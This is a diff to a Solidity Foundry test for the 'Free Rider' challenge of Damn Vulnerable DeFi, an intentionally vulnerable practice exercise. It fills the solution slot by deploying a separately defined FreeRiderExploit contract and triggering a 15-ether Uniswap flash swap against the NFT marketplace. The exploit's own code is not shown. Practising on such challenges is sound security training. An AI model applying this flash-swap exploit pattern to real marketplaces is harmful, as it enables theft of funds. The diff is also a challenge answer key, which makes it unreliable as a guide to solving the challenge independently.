@@ -12,6 +12,8 @@ import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketpl
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import {FreeRiderExploit} from "../../src/attacker-contracts/FreeRiderExploit.sol";
+
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -123,7 +125,17 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+            FreeRiderExploit exploit = new FreeRiderExploit(
+                payable(address(weth)),
+                address(uniswapV2Factory),
+                address(token),
+                payable(address(marketplace)),
+                address(recoveryManager),
+                address(nft),
+                player
+            );
+            
+            exploit.flashSwap(address(weth), 15 ether);
     }
 
     /**
